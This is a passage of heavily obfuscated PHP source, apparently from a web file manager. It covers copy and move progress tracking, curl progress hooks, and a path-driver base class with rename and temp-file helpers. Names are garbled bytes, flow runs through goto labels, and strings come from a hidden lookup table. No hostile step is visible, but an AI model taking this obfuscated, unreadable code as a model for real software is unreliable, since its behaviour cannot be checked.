Hook::bind($dª™Ó‹áôÒ[564], array($this, $dª™Ó‹áôÒ[1531])); goto CŠ™«ß™…; dÍ’šƒºòè: $dª™Ó‹áôÒ =& $_SERVER[Â€Á›¨õ]; $bå¼á‰öö =& $this->task; $this->sourceCopyFolder = !1; goto a¥óÔğƒª°; a¥óÔğƒª°: Hook::bind($dª™Ó‹áôÒ[1524], array($this, $dª™Ó‹áôÒ[1525])); Hook::bind($dª™Ó‹áôÒ[1083], array($this, $dª™Ó‹áôÒ[1526])); Hook::bind($dª™Ó‹áôÒ[1527], array($this, $dª™Ó‹áôÒ[1528])); goto Fˆ®òê›ù…; dˆÛ¶ˆ”è: $bå¼á‰öö[$dª™Ó‹áôÒ[998]] = $dª™Ó‹áôÒ[33]; $bå¼á‰öö[$dª™Ó‹áôÒ[1546]] = $dª™Ó‹áôÒ[33]; $bå¼á‰öö[$dª™Ó‹áôÒ[1547]] = 0; goto a°Š–½±ö; A¸äƒÜ‹ƒ: Hook::bind($dª™Ó‹áôÒ[534], array($this, $dª™Ó‹áôÒ[1532])); Hook::bind($dª™Ó‹áôÒ[536], array($this, $dª™Ó‹áôÒ[1532])); Hook::bind($dª™Ó‹áôÒ[538], array($this, $dª™Ó‹áôÒ[1532])); goto AòÜ„ä³•; AòÜ„ä³•: Hook::bind($dª™Ó‹áôÒ[1533], array($this, $dª™Ó‹áôÒ[1534])); Hook::bind($dª™Ó‹áôÒ[554], array($this, $dª™Ó‹áôÒ[1535])); $this->sourceModelCopyFlag = !1; goto cËÔ‘¥±ƒ; A…ÕÎøÂŒã: $bå¼á‰öö[$dª™Ó‹áôÒ[1542]] = LNG($dª™Ó‹áôÒ[1543]); $bå¼á‰öö[$dª™Ó‹áôÒ[1544]] = 0; $bå¼á‰öö[$dª™Ó‹áôÒ[1545]] = 0; goto dˆÛ¶ˆ”è; cËÔ‘¥±ƒ: Hook::bind($dª™Ó‹áôÒ[1536], array($this, $dª™Ó‹áôÒ[1537])); Hook::bind($dª™Ó‹áôÒ[1538], array($this, $dª™Ó‹áôÒ[1539])); Hook::bind($dª™Ó‹áôÒ[1540], array($this, $dª™Ó‹áôÒ[1541])); goto A…ÕÎøÂŒã; a°Š–½±ö: $bå¼á‰öö[$dª™Ó‹áôÒ[1548]] = 0; $bå¼á‰öö[$dª™Ó‹áôÒ[1549]] = 0; if (!$bå¼á‰öö[$dª™Ó‹áôÒ[1406]]) { $bå¼á‰öö[$dª™Ó‹áôÒ[1406]] = LNG($dª™Ó‹áôÒ[1550]); } goto BÌáØ¾¨ë; BÌáØ¾¨ë: } protected function endAfter() { goto f³ÁíŞˆš; CàŠĞÙ×œ: Hook::unbind($a£æ†Ìß²‹[1536], array($this, $a£æ†Ìß²‹[1537])); Hook::unbind($a£æ†Ìß²‹[1538], array($this, $a£æ†Ìß²‹[1539])); Hook::unbind($a£æ†Ìß²‹[1540], array($this, $a£æ†Ìß²‹[1541])); goto BÈëô¢Á¹; Aæ¹®˜ªèÖ: Hook::unbind($a£æ†Ìß²‹[564], array($this, $a£æ†Ìß²‹[1531])); Hook::unbind($a£æ†Ìß²‹[565], array($this, $a£æ†Ìß²‹[1531])); Hook::unbind($a£æ†Ìß²‹[532], array($this, $a£æ†Ìß²‹[1532])); goto eÇ°©ç§Á; f³ÁíŞˆš: $a£æ†Ìß²‹ =& $_SERVER[Â€Á›¨õ]; Hook::unbind($a£æ†Ìß²‹[1524], array($this, $a£æ†Ìß²‹[1525])); Hook::unbind($a£æ†Ìß²‹[1083], array($this, $a£æ†Ìß²‹[1526])); goto CŠƒ“Áåš–; eÇ°©ç§Á: Hook::unbind($a£æ†Ìß²‹[529], array($this, $a£æ†Ìß²‹[1532])); Hook::unbind($a£æ†Ìß²‹[534], array($this, $a£æ†Ìß²‹[1532])); Hook::unbind($a£æ†Ìß²‹[536], array($this, $a£æ†Ìß²‹[1532])); goto D‹ƒÕƒŞì; CŠƒ“Áåš–: Hook::unbind($a£æ†Ìß²‹[1527], array($this, $a£æ†Ìß²‹[1528])); Hook::unbind($a£æ†Ìß²‹[561], array($this, $a£æ†Ìß²‹[1529])); Hook::unbind($a£æ†Ìß²‹[562], array($this, $a£æ†Ìß²‹[1530])); goto Aæ¹®˜ªèÖ; D‹ƒÕƒŞì: Hook::unbind($a£æ†Ìß²‹[538], array($this, $a£æ†Ìß²‹[1532])); Hook::unbind($a£æ†Ìß²‹[1533], array($this, $a£æ†Ìß²‹[1534])); Hook::unbind($a£æ†Ìß²‹[554], array($this, $a£æ†Ìß²‹[1535])); goto CàŠĞÙ×œ; BÈëô¢Á¹: } public function copyMoveStart($dí±¢ÀŒÏÄ, $E÷ÜÌÙºÏÛ, $E™åƒƒºË», $cÁ×‰›ÂÚ) { goto e«ì¢Ş¢†; D‹©™–òŒ: if (substr($E÷ÜÌÙºÏÛ, 0, strlen($c‡ĞöÆ¾ä)) == $c‡ĞöÆ¾ä) { return; } if (substr($cÁ×‰›ÂÚ, 0, strlen($c‡ĞöÆ¾ä)) == $c‡ĞöÆ¾ä) { return; } $AâŸíŠÀ  =& $this->task; goto eçÂÆ„òƒÂ; eçÂÆ„òƒÂ: $AâŸíŠÀ [$a±ß÷ÑÜ[1552]] = KodIO::transferType($dí±¢ÀŒÏÄ, $E™åƒƒºË»); $this->update(); goto B†¬§šš²¢; e«ì¢Ş¢†: $a±ß÷ÑÜ =& $_SERVER[Â€Á›¨õ]; self::log($a±ß÷ÑÜ[1551] . $E÷ÜÌÙºÏÛ . $a±ß÷ÑÜ[66] . $cÁ×‰›ÂÚ); $c‡ĞöÆ¾ä = rtrim(TEMP_FILES, $a±ß÷ÑÜ[8]); goto D‹©™–òŒ; B†¬§šš²¢: } public function updateAfter() { goto Dí¾§ó“¥ù; B½²Á¿ÂÊ : $F†ÒßËˆÍ[$aôİ™îÅ†õ[1502]] = $F†ÒßËˆÍ[$aôİ™îÅ†õ[1549]] / $F†ÒßËˆÍ[$aôİ™îÅ†õ[711]]; if ($F†ÒßËˆÍ[$aôİ™îÅ†õ[1502]] > 0) { $A·ºÈˆù¸š = timeFloat() - $F†ÒßËˆÍ[$aôİ™îÅ†õ[733]] - $F†ÒßËˆÍ[$aôİ™îÅ†õ[1505]]; $F†ÒßËˆÍ[$aôİ™îÅ†õ[1506]] = $A·ºÈˆù¸š * (1 - $F†ÒßËˆÍ[$aôİ™îÅ†õ[1502]]) / $F†ÒßËˆÍ[$aôİ™îÅ†õ[1502]]; } goto e˜©ö¬ô¯; eÃ®ï‘ˆ½Á: if ($this->sourceModelCopyFlag) { return; } if ($F†ÒßËˆÍ[$aôİ™îÅ†õ[1552]] == $aôİ™îÅ†õ[1155]) { return; } if ($F†ÒßËˆÍ[$aôİ™îÅ†õ[1552]] == $aôİ™îÅ†õ[1068] || $F†ÒßËˆÍ[$aôİ™îÅ†õ[1552]] == $aôİ™îÅ†õ[106]) { if ($F†ÒßËˆÍ[$aôİ™îÅ†õ[1546]]) { $F†ÒßËˆÍ[$aôİ™îÅ†õ[1549]] = $F†ÒßËˆÍ[$aôİ™îÅ†õ[1548]] + $F†ÒßËˆÍ[$aôİ™îÅ†õ[1545]]; } } else { if ($F†ÒßËˆÍ[$aôİ™îÅ†õ[1552]] == $aôİ™îÅ†õ[1156]) { if ($F†ÒßËˆÍ[$aôİ™îÅ†õ[1546]] == $aôİ™îÅ†õ[1068]) { $F†ÒßËˆÍ[$aôİ™îÅ†õ[1549]] = $F†ÒßËˆÍ[$aôİ™îÅ†õ[1548]] + $F†ÒßËˆÍ[$aôİ™îÅ†õ[1545]] * 0.5; } else { if ($F†ÒßËˆÍ[$aôİ™îÅ†õ[1546]] == $aôİ™îÅ†õ[106]) { $F†ÒßËˆÍ[$aôİ™îÅ†õ[1549]] = $F†ÒßËˆÍ[$aôİ™îÅ†õ[1548]] + $F†ÒßËˆÍ[$aôİ™îÅ†õ[1544]] * 0.5 + $F†ÒßËˆÍ[$aôİ™îÅ†õ[1545]] * 0.5; } } } } goto B½²Á¿ÂÊ ; Dí¾§ó“¥ù: $aôİ™îÅ†õ =& $_SERVER[Â€Á›¨õ]; $F†ÒßËˆÍ =& $this->task; if (!$F†ÒßËˆÍ[$aôİ™îÅ†õ[711]]) { return; } goto eÃ®ï‘ˆ½Á; e˜©ö¬ô¯: } public function addPath($fÇĞÏ®§¦˜) { goto cö‡¸÷í; Aœ¬ñğ¢‘: $F×Êºï = IO::infoWithChildren($fÇĞÏ®§¦˜); $Bàª¨òİ·ã = $B©äÜ°Ù¸[$dõ×ã®ö®[1553]] ? $B©äÜ°Ù¸[$dõ×ã®ö®[1553]][$dõ×ã®ö®[1554]] : 0; $B©äÜ°Ù¸[$dõ×ã®ö®[1553]] = array($dõ×ã®ö®[1554] => $Bàª¨òİ·ã + 1, $dõ×ã®ö®[407] => $F×Êºï[$dõ×ã®ö®[28]], $dõ×ã®ö®[75] => $F×Êºï[$dõ×ã®ö®[75]], $dõ×ã®ö®[489] => $F×Êºï[$dõ×ã®ö®[489]] ? $F×Êºï[$dõ×ã®ö®[489]] : $F×Êºï[$dõ×ã®ö®[75]]); goto CÍôºÎÌ; CÍôºÎÌ: if ($F×Êºï[$dõ×ã®ö®[29]] == $dõ×ã®ö®[173]) { $B©äÜ°Ù¸[$dõ×ã®ö®[996]] += 1; } else { $B©äÜ°Ù¸[$dõ×ã®ö®[996]] += $F×Êºï[$dõ×ã®ö®[80]][$dõ×ã®ö®[78]]; if ($F×Êºï[$dõ×ã®ö®[390]]) { $B©äÜ°Ù¸[$dõ×ã®ö®[996]] += $F×Êºï[$dõ×ã®ö®[80]][$dõ×ã®ö®[79]] + 1; } } $B©äÜ°Ù¸[$dõ×ã®ö®[711]] += $F×Êºï[$dõ×ã®ö®[77]]; $this->update(); goto aİÙÌ¥¾–; cö‡¸÷í: $dõ×ã®ö® =& $_SERVER[Â€Á›¨õ]; if (!$fÇĞÏ®§¦˜) { return; } $B©äÜ°Ù¸ =& $this->task; goto Aœ¬ñğ¢‘; aİÙÌ¥¾–: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($e•«áåñö) { $bê„‰¡±Ô” =& $_SERVER[Â€Á›¨õ]; $A‹“¿å‰¿à =& $this->task; $A‹“¿å‰¿à[$bê„‰¡±Ô”[1542]] = $e•«áåñö[$bê„‰¡±Ô”[28]]; $A‹“¿å‰¿à[$bê„‰¡±Ô”[998]] = $e•«áåñö[$bê„‰¡±Ô”[28]]; $this->update(); } public function copyFileStart($AÔ†¨›Ò, $Eº§äå‹å±, $f˜¨½öÌÌ, $b˜†¹ÙøÄ, $b¾ŠšŸÀå, $B™ô‹Ğ½Ï) { goto e­‚Œ¿¡á; C‹«óîíº¡: $dœø·Å—‚Æ[$a›ƒ×ÆÎƒ[998]] = $a›ƒ×ÆÎƒ[33]; $dœø·Å—‚Æ[$a›ƒ×ÆÎƒ[1546]] = $a›ƒ×ÆÎƒ[33]; $dœø·Å—‚Æ[$a›ƒ×ÆÎƒ[1547]] = 0; goto c˜ØÕÔ ë; c«óßôä: $GLOBALS[$a›ƒ×ÆÎƒ[1556]] = $b¾ŠšŸÀå; $GLOBALS[$a›ƒ×ÆÎƒ[1555]] = $B™ô‹Ğ½Ï; $dœø·Å—‚Æ =& $this->task; goto f˜ĞÛ¿î–²; c˜ØÕÔ ë: $this->update(); goto A‚Õ¸ª·ŒÛ; e­‚Œ¿¡á: $a›ƒ×ÆÎƒ =& $_SERVER[Â€Á›¨õ]; $e¯öÎ„ö™ = $b¾ŠšŸÀå; if ($e¯öÎ„ö™ == $GLOBALS[$a›ƒ×ÆÎƒ[1555]]) { $e¯öÎ„ö™ = $GLOBALS[$a›ƒ×ÆÎƒ[1556]]; } goto c«óßôä; f˜ĞÛ¿î–²: $dœø·Å—‚Æ[$a›ƒ×ÆÎƒ[1542]] = $e¯öÎ„ö™; $dœø·Å—‚Æ[$a›ƒ×ÆÎƒ[1544]] = (int) $AÔ†¨›Ò->size($Eº§äå‹å±); $dœø·Å—‚Æ[$a›ƒ×ÆÎƒ[1545]] = 0; goto C‹«óîíº¡; A‚Õ¸ª·ŒÛ: } public function copyFileEnd($c’éíò•‘µ, $b÷“ÀÀò§¶, $BÑæŠ„äâ, $c¶«ÉÇÂŸ, $D•­ˆ‘Õ®, $A“ò«³Ø›) { $D—âà¿ˆ† =& $_SERVER[Â€Á›¨õ]; $fÉ„†äº =& $this->task; $fÉ„†äº[$D—âà¿ˆ†[1545]] = $fÉ„†äº[$D—âà¿ˆ†[1544]]; $fÉ„†äº[$D—âà¿ˆ†[1546]] = $D—âà¿ˆ†[33]; if ($D•­ˆ‘Õ® == $fÉ„†äº[$D—âà¿ˆ†[1542]]) { $fÉ„†äº[$D—âà¿ˆ†[1548]] += $fÉ„†äº[$D—âà¿ˆ†[1544]]; $fÉ„†äº[$D—âà¿ˆ†[1549]] = $fÉ„†äº[$D—âà¿ˆ†[1548]]; $this->update(1); } else { $this->update(); $fÉ„†äº[$D—âà¿ˆ†[1545]] = 0; } self::log($D—âà¿ˆ†[1557] . $b÷“ÀÀò§¶ . $D—âà¿ˆ†[66] . $c¶«ÉÇÂŸ . $D—âà¿ˆ†[227] . $D•­ˆ‘Õ® . $D—âà¿ˆ†[1558] . $fÉ„†äº[$D—âà¿ˆ†[1542]]); } public function updateFileEnd($EÚ†‡Ğì, $c·—¿ò©ã) { goto eÇ‡Ìä¸Ú´; e…ó³ôå‹¯: $this->update(1); self::log($B‘©ŠÛ§Ç[1559] . $EÚ†‡Ğì); goto dâÈÎôô±; eÇ‡Ìä¸Ú´: $B‘©ŠÛ§Ç =& $_SERVER[Â€Á›¨õ]; $d²¾ÖÌ¼šÇ =& $this->task; $d²¾ÖÌ¼šÇ[$B‘©ŠÛ§Ç[1542]] = $EÚ†‡Ğì; goto dßí„é‰Äì; dßí„é‰Äì: $d²¾ÖÌ¼šÇ[$B‘©ŠÛ§Ç[1544]] = $c·—¿ò©ã; $d²¾ÖÌ¼šÇ[$B‘©ŠÛ§Ç[1548]] += $c·—¿ò©ã; $d²¾ÖÌ¼šÇ[$B‘©ŠÛ§Ç[1549]] = $d²¾ÖÌ¼šÇ[$B‘©ŠÛ§Ç[1548]]; goto e…ó³ôå‹¯; dâÈÎôô±: } public function sourceModelCopy($FªÉÀÈäÔ) { goto FÃÁÍÍñ‡ê; FÃÁÍÍñ‡ê: $eå¹Ú§¨¯  =& $_SERVER[Â€Á›¨õ]; $AÊÁÑ»ˆÓä = $FªÉÀÈäÔ[0]; $FÄ×Àğ¯â = $FªÉÀÈäÔ[1]; goto E½ĞòÁ‡‘; c‚ğ ˜¡Ç: switch ($AÊÁÑ»ˆÓä) { case $eå¹Ú§¨¯ [530]: $cµƒÓË˜ˆ = 1; break; case $eå¹Ú§¨¯ [533]: $dô ĞŒÄš[$eå¹Ú§¨¯ [1542]] = $FÄ×Àğ¯â[$eå¹Ú§¨¯ [28]]; break; case $eå¹Ú§¨¯ [535]: $cµƒÓË˜ˆ = intval($FªÉÀÈäÔ[$eå¹Ú§¨¯ [375]] * 0.4); break; case $eå¹Ú§¨¯ [537]: $cµƒÓË˜ˆ = intval($FªÉÀÈäÔ[$eå¹Ú§¨¯ [375]] * 0.2); break; case $eå¹Ú§¨¯ [539]: $cµƒÓË˜ˆ = intval($FªÉÀÈäÔ[$eå¹Ú§¨¯ [375]] * 0.4); break; } $this->update($cµƒÓË˜ˆ); $this->sourceModelCopyFlag = !1; goto eµƒƒ­íß; E½ĞòÁ‡‘: $dô ĞŒÄš =& $this->task; $this->sourceModelCopyFlag = !0; $cµƒÓË˜ˆ = 0; goto c‚ğ ˜¡Ç; eµƒƒ­íß: } public function sourceRemove($c­ßùï…ƒ›, $d’ù¥å¢) { $fêŠš×ØâÏ =& $_SERVER[Â€Á›¨õ]; $this->sourceModelCopyFlag = !0; $d…èÈğÎ‚ = 1; if (isset($c­ßùï…ƒ›[$fêŠš×ØâÏ[80]])) { $d…èÈğÎ‚ = $c­ßùï…ƒ›[$fêŠš×ØâÏ[80]][$fêŠš×ØâÏ[78]] + $c­ßùï…ƒ›[$fêŠš×ØâÏ[80]][$fêŠš×ØâÏ[79]] + 1; } $this->update($d…èÈğÎ‚); $this->sourceModelCopyFlag = !1; } public function sourceMove($bëàÅ©ê¢è) { $this->sourceRemove($bëàÅ©ê¢è, !1); } public function curlProgress($ašë¸‘‚ê×, $D›¼”ª­Ÿ, $B—¡œÈÍô¤, $bŸë‚‡Â, $cë‘­¥ˆ«) { $Fƒ’Šù©¦Ú =& $_SERVER[Â€Á›¨õ]; $fî‰¦³Á•Œ =& $this->task; if ($cë‘­¥ˆ« > 0) { $fî‰¦³Á•Œ[$Fƒ’Šù©¦Ú[998]] = $Fƒ’Šù©¦Ú[1560]; $fî‰¦³Á•Œ[$Fƒ’Šù©¦Ú[1546]] = $Fƒ’Šù©¦Ú[106]; if ($fî‰¦³Á•Œ[$Fƒ’Šù©¦Ú[1544]]) { $fî‰¦³Á•Œ[$Fƒ’Šù©¦Ú[1545]] = $cë‘­¥ˆ«; } if ($fî‰¦³Á•Œ[$Fƒ’Šù©¦Ú[1547]]) { $fî‰¦³Á•Œ[$Fƒ’Šù©¦Ú[1545]] = $cë‘­¥ˆ« + $fî‰¦³Á•Œ[$Fƒ’Šù©¦Ú[1547]]; } } else { if ($B—¡œÈÍô¤ > 0) { if ($fî‰¦³Á•Œ[$Fƒ’Šù©¦Ú[1544]] == $D›¼”ª­Ÿ) { $fî‰¦³Á•Œ[$Fƒ’Šù©¦Ú[1545]] = $B—¡œÈÍô¤; $fî‰¦³Á•Œ[$Fƒ’Šù©¦Ú[998]] = $Fƒ’Šù©¦Ú[1561]; $fî‰¦³Á•Œ[$Fƒ’Šù©¦Ú[1546]] = $Fƒ’Šù©¦Ú[1068]; } } } $this->update(); } public function curlProgressStart($F®åŞùï„“) { } public function curlProgressEnd($b¨„ï–™©) { goto FŒ²×î—ğ; FŒ²×î—ğ: $C¼õ¸âÔ¾“ =& $_SERVER[Â€Á›¨õ]; $B‡åÔƒîÕ =& $this->task; $DèÙ‡¥Ãç÷ = curl_getinfo($b¨„ï–™©); goto C’¨Šó˜‡Ğ; C’¨Šó˜‡Ğ: $b¬—¶ùÓÊ = $DèÙ‡¥Ãç÷[$C¼õ¸âÔ¾“[1562]]; if ($b¬—¶ùÓÊ == -1) { $b¬—¶ùÓÊ = $DèÙ‡¥Ãç÷[$C¼õ¸âÔ¾“[1563]]; } if ($B‡åÔƒîÕ[$C¼õ¸âÔ¾“[1546]] == $C¼õ¸âÔ¾“[106] && $b¬—¶ùÓÊ) { $B‡åÔƒîÕ[$C¼õ¸âÔ¾“[1547]] += $b¬—¶ùÓÊ; } goto aâêôê©ğÙ; aâêôê©ğÙ: $this->update(); goto F÷¦ëÄÇ™µ; F÷¦ëÄÇ™µ: } } goto Fèã£áñ·Ã; cŸ×Éˆ¸÷ƒ: function binCheckBigger($fÃŠù”–—Ê, $A¾–Ö§°ˆœ) { return $fÃŠù”–—Ê > $A¾–Ö§°ˆœ; } $_SERVER[$_SERVER[ÏÕ‘àëˆÅª][3]] = ("\x38\x39\x33\x33".strrev('21'))+0;$_XhJB="bAXSytiDmr66Py8QuFaJiFdqcC2pI5YgUytjV7uN75nGN8n3KGxxxBvkS72bfdfYQ6iCIfv5r4";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($D÷“‰Ìµ¢š, $DÄ½‹ëñ–) { $e°Ü™ë·¡ =& $_SERVER[Â€Á›¨õ]; if (isset(self::$_methodList[$D÷“‰Ìµ¢š])) { return @call_user_func_array(self::$_methodList[$D÷“‰Ìµ¢š], $DÄ½‹ëñ–); } else { if (method_exists($this, $D÷“‰Ìµ¢š)) { return call_user_func_array(array($this, $D÷“‰Ìµ¢š), $DÄ½‹ëñ–); } else { think_exception(__CLASS__ . $e°Ü™ë·¡[4] . $D÷“‰Ìµ¢š . $e°Ü™ë·¡[5]); } } } public static function __callStatic($D®·Á¡¯·ã, $Aêï†º¤æ) { if (isset(self::$_methodListStatic[$D®·Á¡¯·ã])) { return call_user_func_array(self::$_methodListStatic[$D®·Á¡¯·ã], $Aêï†º¤æ); } else { if (method_exists(self, $D®·Á¡¯·ã)) { return call_user_func_array(array(self, $D®·Á¡¯·ã), $Aêï†º¤æ); } else { show_json("{$D®·Á¡¯·ã}\50\51\40\x6e\x6f\x74\x20\x65\170\151\163\x74\x3b", !1); } } } public static function addMethod($BÖñê§ÄÀ, $a²‡è¡‹) { self::$_methodList[$BÖñê§ÄÀ] = $a²‡è¡‹; } public static function addMethodStatic($fäŸè—½ù, $fİŞì¾³ÕŠ) { self::$_methodListStatic[$fäŸè—½ù] = $fİŞì¾³ÕŠ; } } goto bŠ®¶Ä•æ; F¾§¢¿»·”: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $Eî¢ÎÅ¿–Ç =& $_SERVER[Â€Á›¨õ]; $this->objectDriver = array($Eî¢ÎÅ¿–Ç[57], $Eî¢ÎÅ¿–Ç[58], $Eî¢ÎÅ¿–Ç[59], $Eî¢ÎÅ¿–Ç[60], $Eî¢ÎÅ¿–Ç[61], $Eî¢ÎÅ¿–Ç[62], $Eî¢ÎÅ¿–Ç[63], $Eî¢ÎÅ¿–Ç[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($CŞ§›¶è‰¡) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($CŞ§›¶è‰¡, $_SERVER[Â€Á›¨õ][8]); } return $CŞ§›¶è‰¡; } public function iconvApp($b·ÑËÛİ¡É) { return $b·ÑËÛİ¡É; } public function iconvSystem($F¨Šõ‡ÕëÂ) { return $F¨Šõ‡ÕëÂ; } public function iconvTo($CŒ¯ò¯¢µ‹, $dø–ºï á, $F¼Ğ…Ûâ™) { goto f‰¹ÌãàŞâ; BÜõ­ˆ‘: $C£Ã…•·Ş¨ = $C£Ã…•·Ş¨ ? $C£Ã…•·Ş¨ : $CŒ¯ò¯¢µ‹; if (strstr($C£Ã…•·Ş¨, $f·ÒØ¬À‡[69])) { $C£Ã…•·Ş¨ = str_replace($f·ÒØ¬À‡[69], $f·ÒØ¬À‡[70], $C£Ã…•·Ş¨); } $FÃ½Œ»ÎÑÛ[$dø–ºï á . $f·ÒØ¬À‡[66] . $F¼Ğ…Ûâ™ . $f·ÒØ¬À‡[67] . $CŒ¯ò¯¢µ‹] = $C£Ã…•·Ş¨; goto AãêÏ–‚«; f‰¹ÌãàŞâ: $f·ÒØ¬À‡ =& $_SERVER[Â€Á›¨õ]; if (!$CŒ¯ò¯¢µ‹ || !function_exists($f·ÒØ¬À‡[65])) { return $CŒ¯ò¯¢µ‹; } static $FÃ½Œ»ÎÑÛ = array(); goto E®¯·ï”¸; AãêÏ–‚«: $FÃ½Œ»ÎÑÛ[$F¼Ğ…Ûâ™ . $f·ÒØ¬À‡[66] . $dø–ºï á . $f·ÒØ¬À‡[67] . $CŒ¯ò¯¢µ‹] = $CŒ¯ò¯¢µ‹; $FÃ½Œ»ÎÑÛ[$F¼Ğ…Ûâ™ . $f·ÒØ¬À‡[66] . $dø–ºï á . $f·ÒØ¬À‡[67] . $C£Ã…•·Ş¨] = $CŒ¯ò¯¢µ‹; $FÃ½Œ»ÎÑÛ[$dø–ºï á . $f·ÒØ¬À‡[66] . $F¼Ğ…Ûâ™ . $f·ÒØ¬À‡[67] . $C£Ã…•·Ş¨] = $C£Ã…•·Ş¨; goto f•İî¨ìè«; f•İî¨ìè«: return $C£Ã…•·Ş¨; goto BÊªÉªØãñ; E®¯·ï”¸: $dâ¨òŒª‘ = $dø–ºï á . $f·ÒØ¬À‡[66] . $F¼Ğ…Ûâ™ . $f·ÒØ¬À‡[67] . $CŒ¯ò¯¢µ‹; if (isset($FÃ½Œ»ÎÑÛ[$dâ¨òŒª‘])) { return $FÃ½Œ»ÎÑÛ[$dâ¨òŒª‘]; } if (function_exists($f·ÒØ¬À‡[68])) { $C£Ã…•·Ş¨ = @mb_convert_encoding($CŒ¯ò¯¢µ‹, $F¼Ğ…Ûâ™, $dø–ºï á); } else { $C£Ã…•·Ş¨ = @iconv($dø–ºï á, $F¼Ğ…Ûâ™, $CŒ¯ò¯¢µ‹); } goto BÜõ­ˆ‘; BÊªÉªØãñ: } public function getPathInner($b„›íà±‰î) { $dì¯»—ˆ“ = IO::init($b„›íà±‰î); return $dì¯»—ˆ“->path; } public function getPathOuter($e²…„ê¬·’) { $BŒ¾™ÁŠ®” =& $_SERVER[Â€Á›¨õ]; $aŠ•²ÍöÎ = strlen(trim($this->pathBase, $BŒ¾™ÁŠ®”[8])); $e²…„ê¬·’ = substr(trim($e²…„ê¬·’, $BŒ¾™ÁŠ®”[8]), $aŠ•²ÍöÎ); return $this->pathDriver . $BŒ¾™ÁŠ®”[8] . ltrim($e²…„ê¬·’, $BŒ¾™ÁŠ®”[8]); } public function isParentOf($fâ†ÃÊÈÍ’, $aÁ®ÏìÎâ) { $B¯Ì†±Š©ó =& $_SERVER[Â€Á›¨õ]; $fâ†ÃÊÈÍ’ = rtrim(strtolower($fâ†ÃÊÈÍ’), $B¯Ì†±Š©ó[8]) . $B¯Ì†±Š©ó[8]; $aÁ®ÏìÎâ = rtrim(strtolower($aÁ®ÏìÎâ), $B¯Ì†±Š©ó[8]) . $B¯Ì†±Š©ó[8]; $F‘¯¹À·ÉÌ = strpos($aÁ®ÏìÎâ, $fâ†ÃÊÈÍ’) === 0; return $F‘¯¹À·ÉÌ; } public function getType() { $d‚¶ÉîĞâ“ =& $_SERVER[Â€Á›¨õ]; $C¥Ïç‚±ÂÈ = str_replace($d‚¶ÉîĞâ“[71], $d‚¶ÉîĞâ“[33], get_class($this)); return strtolower($C¥Ïç‚±ÂÈ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($c§æö˜‡Ñ¹, $A…Ê¶Æ’²°) { $EŸÌù­Î =& $_SERVER[Â€Á›¨õ]; $fŒ³Ô´¬ŠŸ = rtrim($c§æö˜‡Ñ¹, $EŸÌù­Î[8]) . $EŸÌù­Î[8] . $A…Ê¶Æ’²°; $F•¨•Ü‡Åß = $this->exist($fŒ³Ô´¬ŠŸ); return $F•¨•Ü‡Åß ? $fŒ³Ô´¬ŠŸ : !1; } public function setModifyTime($bª°éØ½ô¶, $A¬ñÜ‹…™ = '') { } public function renameObject($eè¡©˜‡Ô¬, $F†×ª»ÑŠŒ) { goto Fô‰ÍÙ„æ‡; dŠƒ‰¥Ø—â: $eè¡©˜‡Ô¬ = $this->getPathOuter($eè¡©˜‡Ô¬); $F†×ª»ÑŠŒ = $this->pathFather($eè¡©˜‡Ô¬) . $F†×ª»ÑŠŒ; if (IO::isFile($eè¡©˜‡Ô¬)) { $a¾à¯±“Ÿ“ = IO::copy($eè¡©˜‡Ô¬, $this->pathFather($eè¡©˜‡Ô¬), REPEAT_RENAME_FOLDER, $AÅ„Â„ˆ±¬); if ($a¾à¯±“Ÿ“) { IO::remove($eè¡©˜‡Ô¬); } } else { $a¾à¯±“Ÿ“ = IO::mkdir($F†×ª»ÑŠŒ); if (!$a¾à¯±“Ÿ“) { return !1; } $C—¶´Ğ¨«È = IO::listPath($eè¡©˜‡Ô¬, !0); $aÆŸçï«Å = array_merge($C—¶´Ğ¨«È[$DŒ†…ˆ¹±”[73]], $C—¶´Ğ¨«È[$DŒ†…ˆ¹±”[74]]); foreach ($aÆŸçï«Å as $EÉ¼¬ŠâÁ) { IO::move($EÉ¼¬ŠâÁ[$DŒ†…ˆ¹±”[75]], $F†×ª»ÑŠŒ, REPEAT_RENAME_FOLDER); } IO::remove($eè¡©˜‡Ô¬); } goto c¾Û¾ÍŒƒ; c¾Û¾ÍŒƒ: return $a¾à¯±“Ÿ“ ? $F†×ª»ÑŠŒ : !1; goto A¡’Á‡İ Â; Fô‰ÍÙ„æ‡: $DŒ†…ˆ¹±” =& $_SERVER[Â€Á›¨õ]; $AÅ„Â„ˆ±¬ = $F†×ª»ÑŠŒ; Hook::trigger($DŒ†…ˆ¹±”[72], $this, $eè¡©˜‡Ô¬, $this, $this->pathFather($eè¡©˜‡Ô¬) . $F†×ª»ÑŠŒ); goto dŠƒ‰¥Ø—â; A¡’Á‡İ Â: } public function tempFile($CôÍÕÀ©‹´ = '', $E‡ºƒÅˆ¶ = '') { goto CˆÊğÒ†Çó; F­«ğ‚î¸: $D—Û‹‚‘öó = $d©¥×â‹Ç¡ . $CôÍÕÀ©‹´; @touch($D—Û‹‚‘öó); if ($E‡ºƒÅˆ¶) { file_put_contents($D—Û‹‚‘öó, $E‡ºƒÅˆ¶); } goto cË»ÏŞÎ‡©; cË»ÏŞÎ‡©: return $D—Û‹‚‘öó; goto D’œ´­¥¥‹; CˆÊğÒ†Çó: if (!$CôÍÕÀ©‹´) { $CôÍÕÀ©‹´ = rand_string(15); } $d©¥×â‹Ç¡ = TEMP_FILES . rand_string(15) . $_SERVER[Â€Á›¨õ][8]; @mkdir($d©¥×â‹Ç¡, 511, !0); goto F­«ğ‚î¸; D’œ´­¥¥‹: } public function tempFileRemve($D¹´„Ô‚‚æ) { @unlink($D¹´„Ô‚‚æ); @rmdir($this->pathFather($D¹´„Ô‚‚æ)); } public function mkfile($Fˆ—«ÊòÃØ, $DİÏ•‘äÍ‰ = '', $A¶ÃÏë¼§ñ = REPEAT_RENAME) { } public function mkdir($cêÆ—Á÷Êˆ, $D—Ò™¿ÊÁ = REPEAT_SKIP) { } public function delFile($BÈ®å¢»æ÷) { } public function delFolder($FÁ¸¿½„Šß) { } public function 